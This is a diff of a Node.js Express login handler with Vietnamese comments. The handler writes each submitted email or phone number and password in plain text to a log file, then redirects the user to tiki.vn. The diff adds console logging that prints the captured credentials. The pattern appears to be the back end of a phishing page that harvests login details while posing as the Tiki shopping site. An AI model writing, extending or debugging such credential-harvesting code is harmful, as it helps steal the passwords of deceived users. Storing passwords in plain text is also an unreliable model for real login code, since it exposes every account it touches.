@@ -23,11 +23,15 @@ app.post("/login", (req, res) => {
 
   const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;
 
+  // Debugging: In ra logData trước khi ghi vào tệp
+  console.log("Dữ liệu cần ghi vào tệp:", logData);
+
   fs.appendFile(logFilePath, logData, (err) => {
     if (err) {
       console.error("Lỗi khi lưu thông tin:", err);
       return res.status(500).json({ success: false, message: "Lỗi server." });
     }
+    console.log("Tệp đã được ghi thành công.");
     res.json({
       success: true,
       redirectUrl: "https://tiki.vn/",
